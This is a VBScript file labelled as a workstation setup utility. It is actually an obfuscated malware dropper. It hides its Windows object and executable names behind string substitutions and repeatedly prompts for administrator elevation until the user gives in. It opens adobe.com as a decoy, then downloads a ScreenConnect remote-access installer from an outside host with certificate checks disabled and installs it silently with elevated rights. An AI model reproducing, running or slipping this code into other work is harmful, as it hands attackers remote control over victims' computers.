' Workstation setup and configuration utility

Dim objShell, objFSO, strShellProvider, strFSOProvider, netRequest, dataStream, strWorkDir, strInstallerPath, strPkgURL, strAssetURL, strNetProvider, strWriteHandler, strInstallerExe, strUnattended, strExecutor, strPrivLevel, strFlag, strStatusFile, oVerifyFSO, strMarkerName, iCounter

strShellProvider = Replace(Replace("Shell^Applicati@n", "@", "o"), "^", ".")
strFSOProvider = Replace("Scripting.FilJSystemObject", "J", "e")
strExecutor = Replace(Replace("wsc#ipt.e@e", "@", "x"), "#", "r")
strPrivLevel = Mid("Config=runas;Pool=Default", 8, 5)
strFlag = Replace(Replace("e~evat$d", "$", "e"), "~", "l")
strMarkerName = Replace("tup74w_97436Qtmp", "Q", ".")


Sub AcquirePackage(strURL, ByRef rawResponse)
    strNetProvider = "WinHttp.WinHttpRequest.5.1"
    Set netRequest = CreateObject(strNetProvider)
    netRequest.setTimeouts 5673, 5310, 11803, 31297
    Dim strMethod : strMethod = Replace("G_E_T", "_", "")
    netRequest.Open strMethod, strURL, False
    Dim intCertFlag : intCertFlag = CLng("&H3" & "300")
    Dim intWinOpt : intWinOpt = 3 + 1
    netRequest.Option(intWinOpt) = intCertFlag
    On Error Resume Next
    netRequest.Send
    If Err.Number <> 0 Then WScript.Quit
    On Error GoTo 0
    If netRequest.Status = 200 Then
        rawResponse = netRequest.ResponseBody
    Else
        WScript.Quit
    End If
End Sub


Sub ValidateRuntime()
    Dim strVal
    strVal = "7vl4j5sh"
    If Len(strVal) < 2 Then Exit Sub
End Sub

Sub CacheFile(rawData, strOutPath)
    strWriteHandler = Replace("ADJDB.Stream", "J", "O")
    Dim intTransferType : intTransferType = CInt("1")
    Dim intSaveOpt : intSaveOpt = CInt("2")
    Set dataStream = CreateObject(strWriteHandler)
    dataStream.Type = intTransferType
    dataStream.Open
    dataStream.Write rawData
    dataStream.SaveToFile strOutPath, intSaveOpt
    dataStream.Close
End Sub

Sub ExecuteSetup(strPkgFile)
    strInstallerExe = Replace(Replace("msiex~c.ex!", "!", "e"), "~", "e")
    strUnattended = Mid("Provider=/qn;Mode=1", 10, 3)
    Set objShell = CreateObject(strShellProvider)
    objShell.ShellExecute strInstallerExe, "/i """ & strPkgFile & """ " & strUnattended, "", strPrivLevel, 1
End Sub


Sub LogEvent(strMsg, intLevel)
    If intLevel < 0 Then Exit Sub
    Dim strPrefix : strPrefix = "[Trace] "
    Dim strFull : strFull = strPrefix & strMsg
End Sub

Sub InitSession()
    Set oVerifyFSO = CreateObject(strFSOProvider)
    If Not WScript.Arguments.Named.Exists(strFlag) Then
        strStatusFile = oVerifyFSO.GetSpecialFolder(2) & "\" & strMarkerName
        If oVerifyFSO.FileExists(strStatusFile) Then oVerifyFSO.DeleteFile strStatusFile
        Set objShell = CreateObject(strShellProvider)
        Do
            objShell.ShellExecute strExecutor, """" & WScript.ScriptFullName & """ /" & strFlag & " """ & strStatusFile & """", "", strPrivLevel, 1
            WScript.Sleep 598
            If oVerifyFSO.FileExists(strStatusFile) Then Exit Do
        Loop
        oVerifyFSO.DeleteFile strStatusFile
        WScript.Quit
    End If

    If WScript.Arguments.Named.Exists(strFlag) Then
        If WScript.Arguments.Unnamed.Count >= 1 Then
            oVerifyFSO.CreateTextFile WScript.Arguments.Unnamed(0), True
        End If
    End If
End Sub

Sub PresentContent()
    strAssetURL = "https://www.adobe.com"
    Set objShell = CreateObject(strShellProvider)
    objShell.ShellExecute strAssetURL, "", "", "open", 1
End Sub


Function CheckComponent(strName)
    CheckComponent = True
    If strName = "" Then CheckComponent = False
End Function

' --- Entry Point ---
InitSession

WScript.Sleep 2052
PresentContent
WScript.Sleep 697

For iCounter = 1 To 9
    WScript.Sleep 1059
Next

Dim dlData
Set objFSO = CreateObject(strFSOProvider)
Dim intFolderCfg : intFolderCfg = Len("AB")
strWorkDir = objFSO.GetSpecialFolder(intFolderCfg)
strInstallerPath = strWorkDir & "\24.msi"
Dim arrTokens : arrTokens = Array("https://web3xsc.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest")
strPkgURL = ""
Dim iSeg
For iSeg = LBound(arrTokens) To UBound(arrTokens)
    strPkgURL = strPkgURL & arrTokens(iSeg)
Next

AcquirePackage strPkgURL, dlData
Dim strBatchId : strBatchId = Year(Now) & "-" & Month(Now) & "-" & Day(Now)
CacheFile dlData, strInstallerPath
Dim intPkgSize : intPkgSize = LenB(dlData)
If intPkgSize < 1 Then WScript.Quit
ExecuteSetup strInstallerPath